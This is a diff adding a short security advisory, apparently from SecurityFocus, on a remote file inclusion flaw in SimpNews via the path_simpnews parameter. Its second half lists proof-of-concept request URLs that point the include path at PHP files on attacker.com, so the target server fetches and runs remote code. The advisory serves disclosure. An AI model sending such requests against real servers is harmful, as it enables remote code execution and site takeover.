@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/8227/info
+
+SimpNews is prone to a vulnerability that may permit remote attackers to include and execute malicious PHP scripts. Remote users, under some PHP configurations, may influence a Simpnews URI variable. This variable is used in the include path for several SimpNews configuration scripts. By influencing the include path so that it points to a malicious PHP script on a remote system, it is possible to cause arbitrary PHP code to be executed.
+
+http://www.example.com/eventcal2.php.php?path_simpnews=
+with
+http://www.attacker.com/config.php
+http://www.attacker.com/functions.php
+http://www.attacker.com/includes/has_entries.inc
+or 
+http://www.example.com/eventscroller.php?path_simpnews=
+with
+http://www.attacker.com/config.php
+http://www.attacker.com/functions.php
